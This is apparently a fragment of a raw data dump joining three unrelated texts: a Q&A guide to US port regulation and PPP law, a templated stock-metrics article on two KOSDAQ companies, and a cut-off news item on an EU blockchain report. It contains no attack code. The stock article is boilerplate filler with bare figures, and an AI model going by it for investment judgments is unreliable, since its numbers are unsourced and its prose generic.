ports and shipping have not enjoyed regular annual formula funding, often leaving the maritime industry to pursue other funding sources without the benefit of an overarching national strategy. \nThe American Association of Port Authorities (AAPA) is the trade association that advocates for the port industry as a whole when dealing with the US Congress and executive agencies on port funding and policy. Congress in 2017 adopted marginal funding increases for some key AAPA priorities, including a discretionary multimodal grant programme, funding for Army Corps of Engineers dredging and navigation projects, and port security grants. However, current funding levels fall far short of the US$66 billion investment that AAPA has identified as necessary to maintain and modernise key waterways, build adequate roal and rail intermodal connectors and update port infrastructure. \nGiven the lack of a firm federal hand in the development of the country\u2019s ports, it has fallen to state governments and local port authorities to develop their own policies and strategies for financing and implementing growth strategies, and for attracting new cargo streams to and through their regions. This landscape has produced a US port industry that is dynamic and competitive, as individual ports fight to secure their places in the market. \nGreen ports \nWhat \u2018green port\u2019 principles are proposed or required for ports and terminals in your jurisdiction? \nMarine terminal operators must be aware of myriad environmental laws, regulations and programmes at the federal, state and local levels. For example, close attention must be given to air quality initiatives that aim to reduce harmful emissions from vessels (through the use of shore power and other initiatives), as well as cargo handling equipment, drayage trucks and other emissions sources. The Environmental Protection Agency (EPA) maintains a Ports Program with goals to reduce air pollution and greenhouse gases, achieve environmental sustainability for ports and improve air quality for near-port communities. In September 2016, the EPA released a National Port Strategy Assessment outlining strategies for reducing air pollution and greenhouse gases at US ports. \nTerminal operators may face emission restrictions at the state or local level as well, or as key terms of their terminal leases. For example, under the California Environmental Quality Act (CEQA), if a project will have significant environmental impacts, the agency undertaking or permitting that project must impose all feasible mitigation measures. This requirement means that new terminal projects, which invariably bring more throughput, must adopt significant measures to offset the corresponding emissions requirements from the resulting truck, rail and equipment operations. \nClean air is not the only environmental issue terminal operators face, however. Other critical compliance issues include storm water runoff management and treatment, which must meet EPA-prescribed local permit requirements under the under the National Pollutant Discharge Elimination System (NPDES), as well as tightening rules for vessel ballast water management, which are subject to NPDES and Coast Guard regulations. Other regulatory schemes for wetlands protections (including disposal of dredge spoils), handling and storage of oil and hazardous substances and protection of endangered species also impact terminal construction and operation. \nAlso, as discussed further below, marine terminal construction generally triggers a requirement for an environmental impact study under the National Environmental Policy Act and similar state legislation, analysing all projected environmental impacts from the project. As a result, environmental factors and mitigation options are often a leading consideration in any decision to build or rebuild US port facilities. \nLegislative framework and regulation \nDevelopment framework \nIs there a legislative framework for port development or operations in your jurisdiction? \nThere are numerous overlapping legislative and regulatory regimes that apply in the ports sector. \nAt the federal level, a special legislative scheme applies to marine terminal operators (including public ports) that serve \u2018common carriers\u2019 in the international trade - that is, vessels holding themselves out to the public carrying cargo for multiple shippers. Under the Shipping Act of 1984, the Federal Maritime Commission (FMC) regulates marine terminal operators that furnish wharfage, dock, warehouse or other terminal facilities in connection with common carriers in the international trade, or a mix of domestic and international common carriers. \nThe Shipping Act provides for the regulation of various aspects of marine terminal lease agreements and terminal operations, and bars terminal operators from engaging in various \u2018prohibited acts\u2019. Several of these prohibitions involve relatively vague \u2018reasonableness\u2019 determinations, which fall to the regulators to determine on a case-by-case basis (often after extensive litigation). For example, regulated terminal operators are prohibited from engaging in unjust or unreasonable discrimination, or failing to maintain \u2018just and reasonable regulations and practices relating to or connected with receiving, handling, storing or delivering property\u2019 (46 USC sections 41102(c), 41106 (2) and (3)). \nIn 2017 and 2018, the FMC has been conducting a fact-finding investigation and public hearings to try to bring about more reasonable (ie, efficient and transparent) industry practices in connection with demurrage and detention practices in US ports (ie, the sums paid for shippers exceeding free time in storing cargo in the terminal and failing to timely return carrier equipment). \nThe Shipping Act also has measures providing for the elective publication of rates, regulations and other practices in online \u2018marine terminal operator schedules\u2019 - that is, tariffs - that are enforced as an implied contract (46 USC section 40501(f)). It also provides for the mandatory filing and regulation of agreements among terminal operators, or between terminal operators and ocean carriers, to discuss or fix prices, or to engage in cooperative working arrangements. Such agreements enjoy statutory antitrust immunity (46 USC sections 40301(b) and 40302(a)). \nThe Shipping Act is only one of many federal legislative schemes applicable to ports, however. As noted above, the EPA regulates ports from an environmental perspective under the Clean Air Act, the Clean Water Act and other statutes. The Coast Guard is responsible for vessel safety and navigation, and also for port security under the Maritime Transportation Security Act. The Army Corps of Engineers is responsible for dredging in US ports and harbours. Workers in US ports are subject to health and safety protections under the Occupational Safety and Health Administration (OSHA), and are covered by a special workers\u2019 compensation scheme, the Longshore and Harbor Workers\u2019 Compensation Act, administered by the Department of Labor. Numerous federal agencies play a role in policing the flow of cargo and persons through US ports, especially Customs and Border Protection, the Animal and Plant Health Inspection Service of the US Department of Agriculture and US Citizenship and Immigration Services. Hazardous materials storage and handling are subject to a regulatory scheme administered by the US Department of Transportation Pipeline and Hazardous Materials Safety Administration. \nParticular types of specialised terminals may be subject to their own legislative regimes. For example, deepwater ports (eg, offshore terminals like Louisiana Offshore Oil Port) are permitted by the Department of Transportation, while onshore LNG export terminals fall under the lead jurisdiction of the Federal Energy Regulatory Commission. \nAt the state level, the states will generally have a legislative code setting out a legislative framework for port matters. For example, the California Harbors and Navigation Code sets out an extensive legislative scheme for port financing, governance of harbour districts, bond authority, pilotage, vessel operations, safety, salvage, sanitation and numerous other matters. The charter or authorising legislation of the particular local port likely prescribes particular rights and authorities as well, making for a complex interplay of state, federal and local legal schemes. \nRegulatory authorities \nIs there a regulatory authority for each port or for all ports in your jurisdiction? \nSee question 5. \nWhat are the key competences and powers of the port regulatory authority in your jurisdiction? \nSee question 5. In the context of getting terminal deals through, it\u2019s particularly important not to overlook the role of the FMC. The Shipping Act has \u2018reasonableness\u2019 and non-discrimination provisions, which can be a strong incentive for ports to use competitive bidding processes to award leases and concessions to potential operators. As the shipping industry continues to consolidate, marine terminals are feeling the pressure to follow suit; the FMC has oversight to ensure that cooperation and joint ventures between terminals do not unreasonably stifle competition in the ports sector. \nHarbourmasters \nHow is a harbourmaster for a port in your jurisdiction appointed? \nThe appointment of a harbourmaster varies from port to port based on local legislation. In many non-US jurisdictions a harbourmaster is the official primarily responsible for ensuring compliance with navigation, safety and security statutes; however, in the US many of those responsibilities are vested in the Captain of the Port, a United States Coast Guard officer. Similarly, key customs decisions in US ports lie with the Area Port Director, a Customs and Border Protection Official. \nCompetition \nAre ports in your jurisdiction subject to specific national competition rules? \nPorts that serve only domestic shipping, or that serve only \u2018tramp\u2019 operators (ie, tankers and other vessels that sail on charter for a single charterer, rather than multiple shippers), are fully subject to federal antitrust laws and their state counterparts. However, as noted above, terminals that serve common carriers enjoy a limited antitrust immunity under the Shipping Act, but in return their agreements with carriers and other terminals are subject to rigorous oversight by the FMC. In practice, determining whether a terminal serves common carriers and is subject to the Shipping Act can be a difficult and fact-intensive inquiry. \nTariffs \nAre there regulations in relation to the tariffs that are imposed on ports and terminals users in your jurisdictions and how are tariffs collected? \nUnder the Shipping Act of 1984 and FMC rules (specifically, 46 CFR Part 525), marine terminal operators are authorised, but not required, to publish marine terminal operator schedules setting forth their rates, regulations and practices. The benefit to terminal operators is that: \n[a]ny schedule that is made available to the public by the marine terminal operator shall be enforceable by an appropriate court as an implied contract between the marine terminal operator and the party receiving the services rendered by the marine terminal operator, without proof that such party has actual knowledge of the provisions of the applicable terminal schedule. (46 CFR 525.2(a)(2)) \nState or local law may also provide particular rules regarding the validity and enforcement of marine terminals tariffs, for example, making them enforceable as akin to local ordinances, but this varies from state to state. \nAre there restrictions relating to the currency applied to the tariffs or to any fees that are payable by a port operator to the government or port authority? Are any specific currency conditions imposed on port operators more generally? \nAlthough not expressly mandated, all US port transactions are handled in US dollars as a matter of course. \nPublic service obligations \nDoes the state have any public service obligations in relation to port access or services? Can it satisfy these obligations through a contract with a private party? \nUnder the Shipping Act of 1984, marine terminal operators (including public ports) are subject to fairness and non-discrimination standards that apply to their dealings with carriers, cargo owners, and other waterfront business (stevedores, tug operators, line handlers, etc). Also, marine terminal operators cannot unreasonably refuse to deal with any party. Accordingly, ports and terminals that serve common carriers have a public interest obligation that can be at odds with their narrow commercial or financial interests. \nJoint ventures \nCan a state entity enter into a joint venture with a port operator for the development or operation of a port in your jurisdiction? Is the state\u2019s stake in the venture subject to any percentage threshold? \nAs a general matter, yes, a public entity can enter into a joint venture with a private sector operator, and there are no general limits on equity participation levels. However, in practice, such joint venture structures have not been used regularly in the port sector. Rather, public entities have turned over terminal development and operation rights and responsibilities to private operators through leases, concession agreements, exclusive or preferential use agreements or other contractual structures. \nForeign participation \nAre there restrictions on foreign participation in port projects? \nYes. The Exon-Florio law, 50 USC Appendix section 2170, specifies the process by which foreign investments are reviewed, regardless of sector. The US president has the authority under this measure to block proposed or pending foreign \u2018mergers, acquisitions, or takeovers\u2019 of \u2018persons engaged in interstate commerce in the United States\u2019 if they are found to threaten to impair national security. To take such action, the president must conclude that other US laws are inadequate or inappropriate to protect national security, and have \u2018credible evidence\u2019 that the foreign investment will impair national security. \nThe Committee on Foreign Investment in the United States (CFIUS) is the interagency committee that serves the president in investigating and reviewing the national security implications of foreign investment under this section. The investigative authorities and procedures for CFIUS were significantly strengthened in 2007 in response to the attempted takeover of P&O Ports US marine terminal operations by United Arab Emirates-owned DP World. In 2018, CFIUS reportedly raised concerns about a takeover by China\u2019s COSCO Shipping Holdings Co of a large container terminal in Long Beach, California, as part of COSCO\u2019s deal to buy shipping line Orient Overseas International Ltd. \nAlso in 2018, in August Congress passed the Foreign Investment Risk Review and Modernization Act of 2018 (FIRRMA) to significantly broaden and strengthen CFIUS, providing additional measures for countries of special concern (likely meant to target China), specifically adding maritime real estate transactions and critical infrastructure investments to CFIUS\u2019 scope, and implementing various procedural changes to increase CFIUS\u2019 impact. \nPublic procurement and PPP \nLegislation \nIs the legislation governing procurement and PPP general or specific? \nThe legislation directly controlling the administration of port procurement and PPP agreements is specific to the port\u2019s state or locality. In some areas it might be maritime-specific, but often it is the same set of standards that apply to public procurement across many sectors. \nProposal consideration \nMay the government or relevant port authority consider proposals for port privatisation/PPP other than as part of a formal tender? \nThis issue turns on a case-specific review of the procurement rules that apply in the state or locality where the port is sited. There are no federal port procurement authorities. However, if a port authority awards a terminal concession without a fair, open and competitive process, it places itself at higher risk of facing a complaint of unreasonable discrimination and refusal to deal from an aggrieved competitor under the Shipping Act of 1984. \nJoint venture and concession criteria \nWhat criteria are considered when awarding award port concessions and port joint venture agreements? \nAlthough ports\u2019 priorities vary from case to case, generally port authorities are looking at an economic cost-benefit analysis for a port project. Over the term of the agreement (which can extend for decades), they consider what the bidder is promising for annual payments and how it is structured. Rental payments can include fixed fees and components based on acreage, throughput (and minimum annual guarantees), revenues or other factors, sometimes making direct comparisons between competitors difficult. Of course, long-term capital investment is a crucial factor as well, as ports are increasingly looking for private sector operators and investors to finance infrastructure investments that are out of reach for financially strapped state and local governments. \nManaging risk is an important factor as well: for example, who bears the risk if world trade and port volumes decline, the port is hobbled by climate change or environmental factors, the surrounding road and rail infrastructure fails, or myriad other risk factors come to pass? \nThe financial soundness and the legal and regulatory track record of the bidder and any partners, lenders or other backers is also closely examined. Insurance, indemnities and remedies in default are also key terms that ports examine closely. \nPort authorities often look beyond the four corners of the property at the broader impacts of a terminal proposal: does the bidder have the right incentives and wherewithal to grow the amount of cargo and carriers coming to the port? How will the deal impact waterfront labour unions? How will the ecosystem of other maritime businesses surrounding the port be affected? How is the bidder proposing to meet its environmental compliance responsibilities and also address community concerns regarding pollution, congestion, noise, social justice, security and other issues? \nModel agreement \nIs there a model PPP agreement that is used for port projects? To what extent can the public body deviate from its terms? \nNo, these agreements vary from deal to deal. The FMC maintains an online library of marine terminal operator agreements, which provides examples of some terminal leases and other agreements. \nApproval \nWhat government approvals are required for the implementation of a port PPP agreement in your jurisdiction? Must any specific law be passed in your jurisdiction for this? \nThere is no federal authorisation required for terminal agreements, although the FMC can go to court to seek and have one enjoined if it is found to be substantially anticompetitive, unreasonably impacting shipping prices and service. (The FMC has never successfully done so.) The legislative framework and authorisations required for port PPP deals are generally established at the state or local level. \nProjects \nOn what basis are port projects in your jurisdiction typically implemented? \nThe most typical approach is a landlord port awarding a lease to an operator under a build-operate-transfer (BOT) model. \nTerm length \nIs there a minimum or maximum term for port PPPs in your jurisdiction? What is the average term? \nMarine terminal lease agreements can range from just a few years to several decades; there are no fixed limits. In one recent particularly high-profile PPP, the State of Maryland in 2009 awarded a 50-year lease for the operation of Baltimore\u2019s main container terminal, an important East Coast port. Elsewhere, private operators have signed leases for smaller facilities (eg, Jasper County, SC, and Texas City, TX) for terms exceeding 90 years. \nOn what basis can the term be extended? \nTerminal leases often include optional extension periods, negotiated by the parties. However, decisions regarding additional lease extensions beyond those set out in the lease often implicate many of the same economic, legal and policy concerns as new awards, especially if competing bidders are seeking an opportunity to take over the facility. See question 21. \nFee structure \nWhat fee structures are used in your jurisdiction? Are they subject to indexation? \nSee question 17. \nExclusivity \nDoes the government provide guarantees in relation to port PPPs or grant the port operator exclusivity? \nThese are contractual issues that are negotiated on a case-by-case basis. Any exclusivity agreements that give a port operator a monopoly over particular services in the relevant market (as defined akin to the antitrust laws) will be at risk of a challenge before the FMC, where the parties may need to demonstrate that the benefits of the exclusive arrangement outweigh the adverse impacts on competition and trade. \nOther incentives \nDoes the government or the port authority provide any other incentives to investors in ports? \nOn a federal level, there are no standardised incentives set forth for investors in port facilities; however, parties developing significant port facilities generally seek to negotiate incentives and other favourable terms on a case-by-case basis with the relevant state government or local port authority. \nPort development and construction \nApproval \nWhat government approvals are required for a port operator to commence construction at the relevant port? How long does it typically take to obtain approvals? \nNumerous federal, state and local regulatory requirements must be satisfied before commencing construction of a new marine terminal. These requirements can vary significantly from project to project, depending on state and local laws and project details. However, the most significant aspects of this process are the environmental reviews required under the National Environmental Policy Act (NEPA) and its state counterparts, like the California Environmental Quality Act (CEQA). \nThis environmental review process (and any related litigation) can stretch on for several years. One well-known example is the development of the China Shipping Container Terminal in the Port of Los Angeles. In March 2001, the port issued a permit to construct the terminal, and entered into a lease with China Shipping for the facility. Shortly thereafter, a lawsuit was filed in both state and federal courts alleging that the port failed to comply with the requirements of CEQA for a full analysis of the project\u2019s environmental impacts. California courts ordered a partial halt to ongoing construction and ordered the preparation of a project-specific environmental impact statement/report (EIS/EIR). While part of the terminal was allowed to come online in 2004 as part of a settlement agreement, the final EIS/EIR was not concluded until 2008. It incorporated a number of mitigation measures, including concessions related to aesthetics, air quality, noise, and transportation. Construction was not completed until 2013, and certain issues related to the implementation of some of the mitigation measures still continue to this day. Accordingly, the importance and impact of these environmental reviews cannot be overstated. \nPort construction \nDoes the government or relevant port authority typically undertake any part of the port construction? \nHistorically, most port infrastructure construction was the responsibility of the public sector agencies. However, tightening government budgets, declining port revenue growth and increasing demand caused by larger ships, shoreside congestion, demands for environmental mitigation and other factors have pushed the market towards more creative PPP arrangements and private sector financing and construction of port infrastructure. \nDoes the port operator have to adhere to any specific construction standards, and may it engage any contractor it wishes? \nConstruction must comply with all applicable federal, state and local codes and regulations (including the Army Corps, Coast Guard and EPA, as well as those of state and local authorities). Qualification of contractors is generally controlled by contract and local regulations with the relevant port. \nWhat remedies are available for delays and defects in the construction of the port? \nThese are key contract issues that must be negotiated and addressed in the drafting of any engineering, procurement and construction agreement. \nPort operations \nApproval \nWhat government approvals are required in your jurisdiction for a port operator to commence operations following construction? How long does it typically take to obtain approvals? \nSee question 5. In addition to meeting all local requirements relating to building codes, fire codes, hazardous materials storage and handling and other unique port-specific approvals, terminals must comply with numerous federal operating requirements, as detailed above. For example, FMC-regulated terminals are required to register with the agency before commencing operations, facility security plans must be filed with the Coast Guard, Longshore Act cover must be secured under Labor Department rules and compliance with federal environmental permitting requirements must be established. \nAn equally important undertaking, however, is securing agreements for port labour. In several markets this may require becoming part of a collective bargaining unit and participating in multi-employer pension and benefit plans under the relevant union\u2019s collective bargaining agreement, pursuant to the Employee Retirement Income Security Act (ERISA) and related legislation. \nTypical services \nWhat services does a port operator and what services does the port authority typically provide in your jurisdiction? Do the port authorities typically charge the port operator for any services? \nIt is difficult to generalise, as no two port authorities take an identical approach to dividing responsibilities between the port authority and the tenants or other service providers, and usually the fine details of the relationship are subject to negotiation and contract. However, it is not uncommon for a port authority to assess wharfage and dockage charges on a vessel calling there for use of the berth, even for cargo that is being unloaded from the vessel to a leased terminal. In some ports, cranes and other cargo handling equipment may belong to the port as well, to be operated for a fee. In some ports, tugs and pilots are the responsibility of the port, or a related commission. \nOne key overarching principle to keep in mind is that public port authorities and local government cannot impose taxes or fees on cargo moving through the port, other than bona fide user fees for services and benefits arising from use of port facilities or services. These restrictions derive from the Shipping Act and the Rivers and Harbors Act (33 USC section 5), as well as the Tonnage Clause of the US Constitution. Accordingly, it is not uncommon for ports to adopt fees supporting port security, first responders and even some shared environmental and infrastructure improvement. They are largely foreclosed from charging carriers and tenant terminals simply for using or navigating the port\u2019s harbours and waterways. \nAccess to hinterland \nDoes the government or relevant port authority typically give any commitments in relation to access to the hinterland? To what extent does it require the operator to finance development of access routes or interconnections? \nGiven the widespread concerns regarding congestion and emissions around US ports (particularly container terminals), negotiation over inland transportation linkages, especially the financing and development of rail access and roadway improvements, are key commercial elements of many terminal deals. \nSuspension \nHow do port authorities in your jurisdiction oversee terminal operations and in what circumstances may a port authority require the operator to suspend them? \nSee question 5. \nPort access and control \nIn what circumstances may the port authorities in your jurisdiction access the port area or take over port operations? \nWith regard to taking over port operations, terminal leases generally have detailed provisions regarding remedies for breach, including the standards and processes for a landlord port to terminate a lease. Regarding access, port authority officials and other regulators, including Coast Guard, Customs, APHIS and other agency representatives, routinely visit terminal operations as part of their oversight roles. Such access is generally provided for in terminal agreements. \nFailure to operate and maintain \nWhat remedies are available to the port authority or government against a port operator that fails to operate and maintain the port as agreed? \nSee question 41. \nTransferrable assets \nWhat assets must port operators transfer to the relevant port authority on termination of a concession? Must port authorities pay any compensation for transferred assets? \nThis issue is generally addressed in the text of terminal lease agreements. Generally, infrastructure, buildings, fixtures and other improvements (but not moveable equipment) revert to the landlord port at the end of the lease term, but tenants may seek prospectively to negotiate compensation for such investments. \nMiscellaneous \nSpecial purpose vehicles \nIs a port operator that is to construct or operate a port in your jurisdiction permitted (or required) to do so via a special purpose vehicle (SPV)? Must it be incorporated in your jurisdiction? \nAs a general matter, the use of SPVs is commonplace for structuring the ownership of terminal businesses, although they are not strictly required. Decisions as to structure generally are driven by financing, liability and tax considerations, rather than particular requirements for the use of SPVs or other corporate forms. \nTransferring ownership interests \nAre ownership interests in the port operator freely transferable? \nFor the most part, yes, although some sales may require clearance on antitrust or national security grounds (under the CFIUS process described in question 14). Of course, terminal leases and financing agreements may include change of control provisions that require counterparty assent if there is a sale of the underlying interest in the venture. \nGranting security \nCan the port operator grant security over its rights under the PPP agreement to its project financing banks? Does a port authority in your jurisdiction typically agree to enter into direct agreements with the project financing banks and, if so, what are the key terms? \nIn general, yes, an operator can grant security to financing banks, although the structuring of such deals varies on a case-by-case basis. Ideally, a port authority would like as much protection and recourse as possible in the event of a tenant default, so guarantees, performance bonds and letters of credit from the operators, lenders and other backers can be sought. \nAgreement variation and termination \nIn what circumstances may agreements to construct or operate a port facility be varied or terminated? \nIssues of termination and amendment of port agreements are matters of contract law, subject to the terms of the agreements themselves and the contract law of those jurisdictions. \nContractual breach \nWhat remedies are available to a government or port authority for contractual breach by a port operator? \nIf a terminal operator defaults, the port may bring suit, and has at its disposal all contractual rights and remedies available under its agreement and under the contract law of that state. Securing an award of damages or an injunction might provide little practical relief, however, against a failing operator. \nIn 2017, when Hanjin Shipping Company went into bankruptcy, its Port of Long Beach became a hotly contested asset in the bankruptcy proceedings, and ultimately was allowed to be sold. Similarly, the Port of Oakland in 2016 dealt with the bankruptcy of a major long-term PPP terminal operator tenant. Reflecting on that experience in a presentation before the AAPA, Port of Oakland general counsel Danny Wan highlighted some sensible steps that ports can take at the outset to guard against tenant default and insolvency. Those include an emphasis on due diligence (understanding the tenant\u2019s financials and corporate structure) and careful use of security deposits, guarantees, waivers of certain statutory protections (like the requirement to proceed against tenant assets first), letters of credit and performance and payment bonds. More broadly, he noted the need for tenants to have \u2018skin in the game\u2019 by making capital investments at the outset of the lease. All of these strategies are aimed at providing ports with viable avenues for economic relief in case of a tenant default. \nGoverning law \nMust all port PPP agreements be governed by the laws of your jurisdiction? \nAs a practical matter, yes, port leases are usually required to apply the law of the project state. However, often other agreements relating to the financing, construction and operation of a terminal might apply the laws of New York, Delaware or other US states. Accordingly, in the case of a default or breach, multiple interrelated agreements and the laws of several US states might come into play. \nDisputes \nHow are disputes between the government or port authority and the port operator customarily settled? \nLitigation between port authorities and operators may play out in state or federal courts depending on the identity of the parties and other jurisdictional issues. However, certain marine terminal disputes may also be raised before the FMC under the broad \u2018reasonableness\u2019 standards of the Shipping Act. It is not unusual to see some terminal disputes brought before both the courts and the FMC in parallel, relaying on the same facts but different legal standards and authorities in each proceeding. \nSome US port authorities are organised as agencies or instrumentalities of the state government, and therefore enjoy sovereign immunity from suit under the US Constitution, potentially leaving aggrieved operators with no recourse to pursue claims for lease or statutory violations. See Federal Maritime Comm\u2019n v South Carolina Ports Authority, 535 US 743 (2002).",

      "text": "Checking in on some valuation rankings, Posco ICT Company Ltd. (KOSDAQ:A022100) has a Value Composite score of 52. Developed by James O\u2019Shaughnessy, the VC score uses five valuation ratios. These ratios are price to earnings, price to cash flow, EBITDA to EV, price to book value, and price to sales. The VC is displayed as a number between 1 and 100. In general, a company with a score closer to 0 would be seen as undervalued, and a score closer to 100 would indicate an overvalued company. Adding a sixth ratio, shareholder yield, we can view the Value Composite 2 score which is currently sitting at 50. \nInvestors are constantly trying to make smart moves in the stock market. Taking stock of personal strengths and weaknesses can help the investor attack the market with heightened focus. Often times, individuals may fall into traps that could have been avoided. Coming up with a sound investment plan and setting realistic expectations may help the novice investor become better prepared and focused. Positive returns are attainable with the proper preparation and dedication. Investors working with a longer-term plan might be approaching the stock market from a completely different angle than a shorter-term trader. Investors who plan to be in the market for a long period of time may not be as concerned about the day to day fluctuations as short-term traders. \nIn taking a look at some other notable technicals, Posco ICT Company Ltd. (KOSDAQ:A022100)\u2019s ROIC is 0.108237. The ROIC 5 year average is 0.121944 and the ROIC Quality ratio is 9.440072. ROIC is a profitability ratio that measures the return that an investment generates for those providing capital. ROIC helps show how efficient a firm is at turning capital into profits. \nThe Q.i. Value of Posco ICT Company Ltd. (KOSDAQ:A022100) is 42.00000. The Q.i. Value is a helpful tool in determining if a company is undervalued or not. The Q.i. Value is calculated using the following ratios: EBITDA Yield, Earnings Yield, FCF Yield, and Liquidity. The lower the Q.i. value, the more undervalued the company is thought to be. \nThe FCF Yield 5yr Average is calculated by taking the five year average free cash flow of a company, and dividing it by the current enterprise value. Enterprise Value is calculated by taking the market capitalization plus debt, minority interest and preferred shares, minus total cash and cash equivalents. The average FCF of a company is determined by looking at the cash generated by operations of the company. The Free Cash Flow Yield 5 Year Average of Posco ICT Company Ltd. (KOSDAQ:A022100) is 0.037506. \nShareholder Yield \nWe also note that Posco ICT Company Ltd. (KOSDAQ:A022100) has a Shareholder Yield of 0.000000 and a Shareholder Yield (Mebane Faber) of 0.00001. The first value is calculated by adding the dividend yield to the percentage of repurchased shares. The second value adds in the net debt repaid yield to the calculation. Shareholder yield has the ability to show how much money the firm is giving back to shareholders via a few different avenues. Companies may issue new shares and buy back their own shares. This may occur at the same time. Investors may also use shareholder yield to gauge a baseline rate of return. \nMF Rank \nPosco ICT Company Ltd. (KOSDAQ:A022100) has a current MF Rank of 7647. Developed by hedge fund manager Joel Greenblatt, the intention of the formula is to spot high quality companies that are trading at an attractive price. The formula uses ROIC and earnings yield ratios to find quality, undervalued stocks. In general, companies with the lowest combined rank may be the higher quality picks. \nPI \nWe can now take aquick look at some historical stock price index data. Posco ICT Company Ltd. (KOSDAQ:A022100) presently has a 10 month price index of 0.84104. The price index is calculated by dividing the current share price by the share price ten months ago. A ratio over one indicates an increase in share price over the period. \nA ratio lower than one shows that the price has decreased over that time period. Looking at some alternate time periods, the 12 month price index is 0.76889, the 24 month is 0.87861, and the 36 month is 1.28512. Narrowing in a bit closer, the 5 month price index is 1.13947, the 3 month is 1.15259, and the 1 month is currently 1.02418. \nA highly common way to study stocks is through fundamental analysis. Investors examining the fundamentals may be analyzing the underlying factors that can affect the performance of a particular company. When focusing in on a specific company, investors will look at company management, financial information, business prospects, and industry competition. The goal of digging into the numbers is often times a way to calculate the current value of a company and try to gauge the value into the future. Zooming in on the vital statistics of a company can help provide a glimpse of the company\u2019s overall health. \nThe Value Composite One (VC1) is a method that investors use to determine a company\u2019s value. The Value Composite score of Bosung Power Technology Co., Ltd (KOSDAQ:A006910) is 64. A company with a value of 0 is thought to be an undervalued company, while a company with a value of 100 is considered an overvalued company. The VC1 is calculated using the price to book value, price to sales, EBITDA to EV, price to cash flow, and price to earnings. Similarly, the Value Composite Two (VC2) is calculated with the same ratios, but adds the Shareholder Yield. The Value Composite Two of Bosung Power Technology Co., Ltd (KOSDAQ:A006910) is 60. \nTechnicals \nInvestors may be combing through all the latest earnings reports and trying to make sense of all the numbers. With lots of information readily available, investors may be searching for that next batch of stocks to add to the portfolio. Finding high quality stocks may be at the top of the investor\u2019s checklist. Once high quality stocks are spotted, the investor may be then looking for bargains among those stocks. Many investors will look for stocks that have displayed consistent earnings growth over an extended period of time. When a company drastically over performs for a quarter, investors may be quick to investigate. The same things may be done if a company severely underperforms compared to projections. \nIn taking a look at some other notable technicals, Bosung Power Technology Co., Ltd (KOSDAQ:A006910)\u2019s ROIC is -0.033448. The ROIC 5 year average is -0.043923 and the ROIC Quality ratio is 0.689236. ROIC is a profitability ratio that measures the return that an investment generates for those providing capital. ROIC helps show how efficient a firm is at turning capital into profits. \nWe also note that Bosung Power Technology Co., Ltd (KOSDAQ:A006910) has a Shareholder Yield of 0.000000 and a Shareholder Yield (Mebane Faber) of -0.09510. The first value is calculated by adding the dividend yield to the percentage of repurchased shares. The second value adds in the net debt repaid yield to the calculation. Shareholder yield has the ability to show how much money the firm is giving back to shareholders via a few different avenues. Companies may issue new shares and buy back their own shares. This may occur at the same time. Investors may also use shareholder yield to gauge a baseline rate of return. \nBosung Power Technology Co., Ltd (KOSDAQ:A006910) has a current MF Rank of 12470. Developed by hedge fund manager Joel Greenblatt, the intention of the formula is to spot high quality companies that are trading at an attractive price. The formula uses ROIC and earnings yield ratios to find quality, undervalued stocks. In general, companies with the lowest combined rank may be the higher quality picks. \nWe can now take a quick look at some historical stock price index data. Bosung Power Technology Co., Ltd (KOSDAQ:A006910) presently has a 10 month price index of 0.52087. The price index is calculated by dividing the current share price by the share price ten months ago. A ratio over one indicates an increase in share price over the period. A ratio lower than one shows that the price has decreased over that time period. Looking at some alternate time periods, the 12 month price index is 0.79394, the 24 month is 0.94414, and the 36 month is 0.53854. Narrowing in a bit closer, the 5 month price index is 1.34359, the 3 month is 1.04591, and the 1 month is currently 0.93073. \nThe C-Score is a system developed by James Montier that helps determine whether a company is involved in falsifying their financial statements. The C-Score is calculated by a variety of items, including a growing difference in net income verse cash flow, increasing days outstanding, growing days sales of inventory, increasing assets to sales, declines in depreciation, and high total asset growth. The C-Score of Bosung Power Technology Co., Ltd (KOSDAQ:A006910) is 0.00000. The score ranges on a scale of -1 to 6. If the score is -1, then there is not enough information to determine the C-Score. If the number is at zero (0) then there is no evidence of fraudulent book cooking, whereas a number of 6 indicates a high likelihood of fraudulent activity. The C-Score assists investors in assessing the likelihood of a company cheating in the books. \nInvestors may be analyzing the portfolio as we continue to move closer to the end of the year. Studying first half results may assist to identify trades that panned out, and those that didn\u2019t. Keeping tabs on pervious trade outcomes may be a good way to accurately see what actually happened. It may be necessary to dig a little deeper to try and figure out why certain trades worked, and why others did not. Many investors may feel like they have missed the boat, and they may be wondering if stocks will see increased momentum closing out the year. Attaining comprehensive knowledge of the markets may take years to truly figure out. Combining technical analysis and tracking fundamentals may help the investor see the complete picture and develop confidence for trading into the future. Being able to sift through the endless sea of information may take some perseverance and extreme focus.",

      "title": "EU Blockchain Observatory Releases Report on Tokenization, AI and IoT",
      "text": "The European Union Blockchain Observatory and Forum released a report entitled \u201cTokenization of physical assets and the impact of IoT and AI\u201d on April 10 . \nThe report, authored by Dr. Tim Weing\u00e4rtner, a professor at Lucerne University of Applied Sciences & Arts \u2013 School for Information Technology, features the \u201cdigital twin\u201d concept, which refers to a digital replica of the physical world. This mirror world would be consist of Internet of Things ( IoT ) devices, big data, tokens representing physical objects, blockchain as a trusted ledger and Artificial Intelligence ( AI ). \nThe report notes that blockchain would play a key role in this digital transformation by providing trust and allowing the identification and tokenization of physical objects. Blockchain-based smart contracts also play their part, the report argues, by providing a tamper-proof computational environment and automatic execution of financial actions through the use of cryptocurrencies . \nThe document highlights the importance of tokens and cites the Ethereum ( ETH ) blockchain as currently the most important platform for the creation of tokens. According to the author, this platform is preferable due to the potential of its programming language, its large community, working implementations and existing code examples. \nThe report concludes that the combination of IoT with blockchain would allow for better supply chain management, increased trust that enables the sharing economy to grow, data trading and monetization, identity management and automatization. Combining AI with decentralized technology would instead democratize data, assure its authenticity, audit smart contracts and explain AI decisions. \nAt the same time, the report claims, robots and drones would be \u201cthe actuators of the digital world,\u201d since they would allow the intervention of the digital world in the physical world. The document expects the digital twin concept to become increasingly important: \n\u201cDue to the exponential growth, which is described by Moore\u2019s Law and many studies, the physical world will be exceeded by the digital world in the coming years. This means that speed, growth and complexity will increase by a multiple.\u201d \nMoore\u2019s law refers to the observation \u2014 made by Intel\u2019s CEO Gordon Moore in 1965 \u2014 that the number of transistors in dense integrated circuits doubles roughly every two years. However, the report fails to mention that the rate of progress in fitting more transistors in less space is slowing down . Furthermore, the scale of transistors is currently approaching an ultimate limit because of a quantum property known as quantum tunneling. \nMoreover, progress is being made to continue the development of alternative processing technologies such as quantum computing , optical computing and neuromorphic computing . Such technologies could permit the continuation of the trend towards increasing available computing power. \nIn March, a different report released by the same 